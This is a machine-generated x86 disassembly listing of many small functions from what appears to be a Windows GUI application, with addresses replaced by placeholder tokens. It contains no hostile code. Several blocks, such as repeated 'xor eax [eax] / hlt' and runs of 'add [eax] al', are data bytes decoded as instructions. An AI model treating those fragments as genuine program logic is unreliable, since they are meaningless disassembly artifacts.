retn
push 0x0
call PostQuitMessage
sub_45a729
jmp sub_4038ec
sub_45a730
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45a7f7
jmp sub_4038ec
sub_45a7fe
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a9d4
jmp sub_4038ec
sub_45a9db
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45aa3c
jmp sub_4038ec
sub_45aa43
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45aa4c
call sub_45a814
retn
sub_45ac37
jmp sub_403638
sub_45ac90
jmp sub_4038ec
sub_45ac97
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45adc5
jmp sub_4038ec
sub_45af24
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_45b223
jmp sub_4038ec
sub_45b252
jmp sub_4038ec
sub_45b35e
jmp sub_4038ec
sub_45b365
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45b6f6
jmp sub_4038ec
sub_45b6fd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b820
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_45b86b
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_45b87c
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_45b88c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_45b8ff
jmp sub_4038ec
sub_45b906
pop ebp
retn
sub_45b908
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45b89c
call sub_403cbc
call sub_45b820
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_451544
call sub_413b3c
sub_45b981
xor eax [ eax ]
hlt
sub_45ba51
xor eax [ eax ]
hlt
sub_45bb05
xor eax [ eax ]
hlt
sub_45bbd9
xor eax [ eax ]
hlt
sub_45bc89
xor eax [ eax ]
hlt
sub_45bded
xor eax [ eax ]
hlt
sub_45c2bd
xor eax [ eax ]
hlt
sub_45c428
push ebx
mov ebx [ eax + 0x8 ]
sub ebx [ eax ]
mov [ edx ] ebx
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ ecx ] edx
pop ebx
retn
sub_45c4e0
push esi
cmp dl [ eax + 0x21 ]
je r-xdata
pop esi
retn
mov [ eax + 0x21 ] dl
mov si 0xfffd
call sub_403394
sub_45c4f4
push esi
cmp dl [ eax + 0x20 ]
je r-xdata
pop esi
retn
mov [ eax + 0x20 ] dl
mov si 0xfffd
call sub_403394
sub_45c6fc
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_45c708
cmp ecx [ edx ]
je r-xdata
retn
mov [ edx ] ecx
call sub_45c6fc
sub_45c714
cmp cl [ edx ]
je r-xdata
retn
mov [ edx ] cl
call sub_45c6fc
sub_45c720
lea ecx [ eax + 0x4 ]
xchg edx ecx
call sub_45c708
retn
sub_45c72c
lea ecx [ eax + 0x10 ]
xchg edx ecx
call sub_45c708
retn
sub_45c738
lea ecx [ eax + 0x14 ]
xchg edx ecx
call sub_45c708
retn
sub_45c744
lea ecx [ eax + 0x18 ]
xchg edx ecx
call sub_45c708
retn
sub_45c798
lea ecx [ eax + 0xc ]
xchg edx ecx
call sub_45c714
retn
sub_45c7cc
lea ecx [ eax + 0x24 ]
xchg edx ecx
call sub_45c714
retn
sub_45ca60
cmp [ eax + 0x94 ] 0x0
je r-xdata
retn
add eax 0x94
call sub_40d3ac
sub_45caa0
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call GetBkMode
pop ebx
retn
sub_45caf0
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call GetBkColor
pop ebx
retn
sub_45cbbc
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call SetTextAlign
pop esi
pop ebx
retn
sub_45cff8
mov eax [ eax + 0x4 ]
call sub_41dd60
retn
sub_45d074
push ebp
mov ebp esp
pop ebp
retn 0x10
sub_45d340
mov eax [ eax + 0x4 ]
call sub_45d2dc
retn
sub_45d508
push ebx
mov ebx eax
push 0x0
mov eax ebx
call sub_41dd60
push eax
call SelectClipRgn
pop ebx
retn
sub_45d51c
mov eax [ eax + 0x4 ]
call sub_45d508
retn
sub_45dfc4
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
retn
sub_45e4f8
mov dl [ eax + 0x91 ]
mov [ eax + 0x90 ] dl
mov [ eax + 0x91 ] 0x0
retn
sub_45e50c
mov dl [ eax + 0x90 ]
mov [ eax + 0x91 ] dl
retn
sub_45e51c
mov [ eax + 0x9a ] 0x1
retn
sub_45e708
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_45fca8
xor eax eax
retn
sub_45fcac
xor eax eax
retn
sub_45fcb0
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41dd60
push eax
call GetTextAlign
pop ebx
retn
sub_45fcc4
mov al [ eax + 0x98 ]
retn
sub_45fccc
push ebx
mov ebx eax
mov [ ebx + 0x98 ] dl
cmp [ ebx + 0x98 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
je r-xdata
mov eax ebx
call sub_45ca60
mov [ ebx + 0x9a ] 0x1
sub_45fcf8
mov al [ eax + 0x99 ]
retn
sub_4603bc
push ebx
mov ecx [ eax ]
mov ebx [ edx ]
mov [ eax ] ebx
mov [ edx ] ecx
pop ebx
retn
sub_4603ed
jmp sub_4038ec
sub_4603f4
pop ebp
retn
sub_4603f8
sub [ rw-data ] 0x1
retn
sub_46053d
jmp sub_4038ec
sub_460544
pop ebp
retn
sub_460548
sub [ rw-data ] 0x1
retn
sub_460585
xor eax [ eax ]
hlt
sub_4605e1
xor eax [ eax ]
hlt
sub_46085d
xor eax [ eax ]
hlt
sub_4608f9
xor eax [ eax ]
hlt
sub_460bb1
xor eax [ eax ]
hlt
sub_460d87
jmp sub_4038ec
sub_460d8e
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
sub_460e78
jmp sub_4038ec
sub_460e7f
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_460f06
jmp sub_4038ec
sub_460f0d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x8
sub_460f1c
and eax 0x8000000f
jns r-xdata
inc eax
mov eax [ eax * 4 + rw-data ]
retn
dec eax
or eax 0xfffffff0
inc eax
sub_460f9f
jmp sub_4038ec
sub_460fa6
pop ebx
mov esp ebp
pop ebp
retn
sub_461188
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_461194
push ebx
mov ebx eax
mov eax ebx
call sub_42a8f4
mov eax [ ebx + 0x288 ]
xor edx edx
mov [ eax + 0x18 ] edx
pop ebx
retn
sub_4611ac
push esi
mov esi eax
mov eax [ esi + 0x27c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4611bc
lea ecx [ eax + 0x278 ]
xchg edx ecx
call sub_461550
retn
sub_4613d0
push esi
mov eax [ eax + 0x288 ]
mov esi [ eax + 0x8 ]
mov eax [ esi + 0x1c ]
mov [ edx + 0x1c ] eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4614cd
jmp sub_4038ec
sub_4614d4
mov esp ebp
pop ebp
retn
sub_4614d8
push esi
mov esi eax
cmp ecx [ edx ]
je r-xdata
pop esi
retn
mov [ edx ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46153c
push esi
mov esi eax
cmp ecx [ edx ]
je r-xdata
pop esi
retn
mov [ edx ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_461550
push esi
mov esi eax
cmp cl [ edx ]
je r-xdata
pop esi
retn
mov [ edx ] cl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_461578
push ebx
mov ebx eax
mov eax ebx
call sub_43c62c
mov ax [ ebx + 0x78 ]
mov [ ebx + 0x268 ] ax
pop ebx
retn
sub_4615bc
push esi
mov esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
or [ esi + 0xc ] 0x1
pop esi
retn
sub_4615cc
push ebx
mov ebx edx
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebx + 0xc ] 0x1
pop ebx
retn
mov edx ebx
call sub_43f1ac
sub_461740
jmp sub_4038ec
sub_461747
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4617ac
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4617b8
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
retn
sub_4618d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
pop esi
pop ebx
retn
sub_4618ec
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0xc ]
retn
sub_4618f8
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
retn
sub_461ae8
lea ecx [ eax + 0x2b4 ]
xchg edx ecx
call sub_461550
retn
sub_461af8
lea ecx [ eax + 0x2b0 ]
xchg edx ecx
call sub_461564
retn
sub_461b08
push esi
mov esi eax
mov eax [ esi + 0x2b8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_461b18
push esi
mov esi eax
cmp dl [ esi + 0x2bc ]
je r-xdata
pop esi
retn
mov [ esi + 0x2bc ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_461c30
mov eax [ eax + 0x2c0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_461fac
mov ecx [ eax + 0x2b8 ]
cmp [ ecx + 0xc ] 0x0
je r-xdata
retn
xor ecx ecx
call sub_461e28
sub_462204
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
call sub_460de4
xor al 0x1
pop ebx
retn
sub_462278
push esi
mov esi eax
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_462288
push esi
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_4623d6
jmp sub_4038ec
sub_4623dd
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4627ac
jmp sub_4038ec
sub_4627b3
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403764
jmp sub_403764
sub_4628a2
jmp sub_4038ec
sub_4628a9
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4628b4
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov edx esp
mov eax sub_4627bc
call sub_405464
pop ecx
pop edx
retn
sub_46291f
jmp sub_4038ec
sub_462926
pop ebp
retn
sub_462928
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
mov eax [ rw-data ]
push eax
call LoadCursorA
mov ecx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0x7e4
call sub_45851c
sub_462a8d
xor eax [ eax ]
hlt
sub_462c0d
xor eax [ eax ]
hlt
sub_462d15
xor eax [ eax ]
hlt
sub_462dc5
xor eax [ eax ]
hlt
sub_462e75
xor eax [ eax ]
hlt
sub_4634c9
xor eax [ eax ]
hlt
sub_463cbd
xor eax [ eax ]
hlt
sub_463f11
xor eax [ eax ]
hlt
sub_463f71
xor eax [ eax ]
hlt
sub_463fe5
xor eax [ eax ]
hlt
sub_46449d
xor eax [ eax ]
hlt
sub_464605
les eax [ esi ]
in al 0xc4
inc esi
add [ eax - 0x48 ] ah
inc esi
add al bl
mov bl 0x46
add [ esi + ebp * 4 - 0x3b87ffba ] bl
inc esi
add [ ebp + eax * 8 + 0x46 ] bh
add [ eax ] dl

sub_464b88
lea ecx [ eax + 0x14 ]
mov eax [ eax + 0x4 ]
xchg edx ecx
call sub_4614ec
retn
sub_464e28
mov eax [ eax + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_464e34
mov eax [ eax + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_464e40
mov eax [ eax + 0x80 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_464e4c
mov eax [ eax + 0x3c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_464e58
mov eax [ eax + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_464e64
lea ecx [ eax + 0x40 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461550
retn
sub_464e78
mov eax [ eax + 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_464eec
mov edx eax
fld [ edx + 0xa0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_464f08
mov edx eax
fld [ edx + 0xa0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_464f1d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x5f7d2230 ] cl
add [ eax ] al
add al bl
sbb eax r-xdata
fnstsw ax
sahf
setne al
retn
sub_465194
lea ecx [ eax + 0x64 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_4614ec
retn
sub_4651a8
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4651b4
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ eax + 0x98 ]
mov eax [ eax + 0x90 ]
call sub_461514
pop ebp
retn 0x8
sub_4651d4
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ eax + 0xa0 ]
mov eax [ eax + 0x90 ]
call sub_461514
pop ebp
retn 0x8
sub_4651f4
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ eax + 0xa8 ]
mov eax [ eax + 0x90 ]
call sub_461514
pop ebp
retn 0x8
sub_465214
lea ecx [ eax + 0x69 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461550
retn
sub_465228
lea ecx [ eax + 0x6a ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461550
retn
sub_46523c
lea ecx [ eax + 0x8c ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461550
retn
sub_465518
jmp sub_4038ec
sub_46551f
mov eax esi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4655a7
jmp sub_4038ec
sub_4655ae
mov eax esi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4655b8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x5 ] 0x0
je r-xdata
mov al 0x1
retn
sub_4655cc
cmp [ eax + 0x4 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
mov al 0x1
retn
sub_465b54
jmp sub_4038ec
sub_465b5b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_465e2f
jmp sub_4038ec
sub_465e36
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465e9c
lea ecx [ eax + 0x41 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461550
retn
sub_465eb0
push esi
mov esi eax
mov eax [ esi + 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_465ec0
push ebx
mov ebx eax
mov eax [ ebx + 0x48 ]
call sub_460de4
xor al 0x1
pop ebx
retn
sub_465fa5
jmp sub_4038ec
sub_465fac
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_465fb4
lea ecx [ eax + 0x60 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_4614ec
retn
sub_465fc8
lea ecx [ eax + 0x8d ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461550
retn
sub_46603c
jmp sub_4038ec
sub_466043
pop ecx
pop ebp
retn
sub_46610c
jmp sub_4038ec
sub_466113
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_466176
jmp sub_4038ec
sub_46617d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4661e2
jmp sub_4038ec
sub_4661e9
pop ecx
pop ebp
retn
sub_4661ec
lea ecx [ eax + 0x54 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461564
retn
sub_466200
lea ecx [ eax + 0x34 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461564
retn
sub_466214
lea ecx [ eax + 0x4c ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461550
retn
sub_466228
lea ecx [ eax + 0x68 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461550
retn
sub_46623c
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
mov eax [ eax + 0x90 ]
mov edx [ eax ]
call [ edx + 0x80 ]
sub_466254
lea ecx [ eax + 0x94 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461550
retn
sub_4662f7
jmp sub_4038ec
sub_4662fe
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_46637c
jmp sub_4038ec
sub_466383
pop ecx
pop ebp
retn 0x8
sub_466388
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ eax + 0x18 ]
mov eax [ eax + 0x90 ]
call sub_461514
pop ebp
retn 0x8
sub_466414
jmp sub_4038ec
sub_46641b
pop ecx
pop ebp
retn 0x8
sub_4664a0
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ eax + 0x10 ]
mov eax [ eax + 0x90 ]
call sub_461514
pop ebp
retn 0x8
sub_4664bc
lea ecx [ eax + 0x88 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461564
retn
sub_4664d0
lea ecx [ eax + 0x74 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461564
retn
sub_4664e4
lea ecx [ eax + 0x70 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461564
retn
sub_4664f8
lea ecx [ eax + 0x84 ]
mov eax [ eax + 0x90 ]
xchg edx ecx
call sub_461564
retn
sub_466912
jmp sub_4038ec
sub_466919
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_466da0
mov edx [ eax + 0xd8 ]
sub edx [ eax + 0xd4 ]
mov [ eax + 0xdc ] edx
mov edx [ eax + 0xd4 ]
add edx [ eax + 0xd8 ]
sar edx 0x1
jns r-xdata
mov [ eax + 0xcc ] edx
retn
adc edx 0x0
sub_4679ec
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0xc ]
mov [ ecx + edx * 4 ] eax
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
pop ebp
retn
sub_467c53
jmp sub_4038ec
sub_467c5a
mov al [ ebp - 0xd ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467f9d
jmp sub_4038ec
sub_467fa4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468097
jmp sub_4038ec
sub_46809e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4680d4
push ebp
mov ebp esp
fld1
fld [ ebp + 0x8 ]
fyl2x
fld1
fld [ ebp + 0x14 ]
fyl2x
fdivp st1
fwait
pop ebp
retn 0x18
sub_468638
jmp sub_4038ec
sub_46863f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46881d
jmp sub_4038ec
sub_468824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468847
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_404f24
retn
sub_468840
jmp sub_4038ec
sub_468847
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46888c
mov edx [ eax + 0x30 ]
mov ecx [ edx + 0x14 ]
push ecx
mov ecx [ eax + 0x34 ]
push ecx
mov ecx [ edx + 0xc ]
mov edx [ edx + 0x8 ]
call sub_4688b8
retn
sub_468c54
mov eax [ eax + 0x8 ]
mov eax [ eax + 0x8 ]
retn
sub_469230
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
call sub_460de4
xor al 0x1
pop ebx
retn
sub_469240
lea ecx [ eax + 0x28 ]
mov eax [ eax + 0x20 ]
xchg edx ecx
call sub_46b780
retn
sub_469250
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_46925c
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_469268
lea ecx [ eax + 0x8 ]
mov eax [ eax + 0x20 ]
xchg edx ecx
call sub_46b74c
retn
sub_469278
lea ecx [ eax + 0xc ]
mov eax [ eax + 0x20 ]
xchg edx ecx
call sub_46c148
retn
sub_469288
lea ecx [ eax + 0x10 ]
mov eax [ eax + 0x20 ]
xchg edx ecx
call sub_46b780
retn
sub_46937c
push esi
mov esi eax
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_46938c
cmp dl [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x20 ]
call sub_46ae80
sub_4693a0
lea ecx [ eax + 0x11 ]
mov eax [ eax + 0x20 ]
xchg edx ecx
call sub_46b780
retn
sub_46953c
jmp sub_4038ec
sub_469543
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4697d4
cmp [ eax + 0x40 ] 0x0
jne r-xdata
retn
mov edx [ eax + 0x3c ]
test edx edx
je r-xdata
mov eax edx
call sub_46a6d0
sub_4697ec
push ebp
mov ebp esp
add esp 0xfffffff8
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x4
sub_46986c
jmp sub_4038ec
sub_469873
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469db2
jmp sub_4038ec
sub_469db9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469e98
add esp 0xfffffff8
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
fld [ esp ]
pop ecx
pop edx
retn
sub_469f58
jmp sub_4038ec
sub_469f5f
pop ecx
pop ebp
retn 0x8
sub_469f68
cmp dl [ eax + 0x39 ]
je r-xdata
retn
mov [ eax + 0x39 ] dl
call sub_4697d4
sub_469f78
cmp dl [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] dl
call sub_4697d4
sub_469f88
mov eax [ eax + 0x3c ]
retn
sub_469f8c
test edx edx
je r-xdata
retn
call sub_469e74
sub_469f98
mov al 0x1
retn
sub_46a156
jmp sub_4038ec
sub_46a15d
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_46a1b0
mov eax [ eax + 0x68 ]
retn
sub_46a1d8
mov al 0x1
retn
sub_46a33a
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_46a343
jmp sub_4038ec
j_sub_46a33a
jmp sub_46a33a
sub_46a34a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a350
mov eax [ eax + 0xf0 ]
xchg edx eax
call sub_4197d4
retn
sub_46a505
jmp sub_4038ec
sub_46a50c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a56c
mov eax [ eax + 0x8c ]
retn
sub_46a574
mov al 0x1
retn
sub_46a578
mov al 0x1
retn
sub_46a6b8
push eax
mov eax [ eax ]
mov eax [ eax + 0x144 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c45c
retn
sub_46a6d0
push esi
mov esi [ eax + 0x68 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x108 ]
sub_46a808
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46a7b0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebp
retn
sub_46a9fb
jmp sub_4038ec
sub_46aa02
pop ebx
mov esp ebp
pop ebp
retn
sub_46aa30
cmp eax edx
setne al
retn
sub_46aa38
mov al 0x1
retn
sub_46aa3c
call sub_46ae80
retn
sub_46aafa
jmp sub_4038ec
sub_46ab01
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ab0c
mov ecx [ eax + 0x68 ]
test ecx ecx
je r-xdata
retn
xchg ecx eax
xchg edx ecx
call sub_46e558
sub_46ab1c
or eax 0xffffffff
retn
sub_46aba4
push ebx
mov ebx eax
cmp dl [ ebx + 0x90 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x90 ] dl
mov eax ebx
call sub_46ab20
mov eax ebx
call sub_46ae80
sub_46abc8
push ebx
mov ebx eax
cmp dl [ ebx + 0xa0 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0xa0 ] dl
mov eax ebx
call sub_46ab20
mov eax ebx
call sub_46ae80
sub_46ac2f
jmp sub_4038ec
sub_46ac36
pop ebx
pop ecx
pop ebp
retn
sub_46ae80
push esi
push edi
mov esi eax
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
pop edi
pop esi
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46ae98
retn
sub_46ae9c
lea ecx [ eax + 0x30 ]
xchg edx ecx
call sub_46b780
retn
sub_46aef1
jmp sub_4038ec
sub_46aef8
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46af49
jmp sub_4038ec
sub_46af50
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46af58
mov edx ecx
mov ecx [ eax ]
call [ ecx + 0xa0 ]
retn
sub_46b122
jmp sub_4038ec
sub_46b129
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b130
mov eax edx
retn
sub_46b2fb
jmp sub_4038ec
sub_46b302
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46b3b8
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_46b3c0
xor ecx ecx
mov dl 0x3
call sub_46cc98
retn
sub_46b3cc
push ebx
mov ebx edx
mov eax ebx
call sub_403ee8
pop ebx
retn
sub_46b4a8
retn
sub_46b4ac
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_46b4cc
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_46b6dc
jmp sub_4038ec
sub_46b6e3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b6fb
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ ecx ] eax
retn
sub_46b710
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ ecx ] eax
retn
sub_46b74c
cmp ecx [ edx ]
je r-xdata
retn
mov [ edx ] ecx
call sub_46ae80
sub_46b780
cmp cl [ edx ]
je r-xdata
retn
mov [ edx ] cl
call sub_46ae80
sub_46b8b8
push ebx
push 0x0
push 0x0
mov ecx 0x1fffffff
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebx
retn
sub_46b9c8
call sub_46b9bc
retn
sub_46bace
jmp sub_4038ec
sub_46bad5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46bae8
add esp 0xfffffff8
mov ecx [ eax ]
call [ ecx + 0xfc ]
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_46bdb0
jmp sub_4038ec
sub_46bdb7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46bdc3
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x357883b8 ] cl
call sub_46b758
retn
sub_46bdd8
lea ecx [ eax + 0x6c ]
xchg edx ecx
call sub_46b758
retn
sub_46be20
mov eax 0x1a
retn
sub_46c117
jmp sub_4038ec
sub_46c11e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c148
cmp ecx [ edx ]
je r-xdata
retn
mov [ edx ] ecx
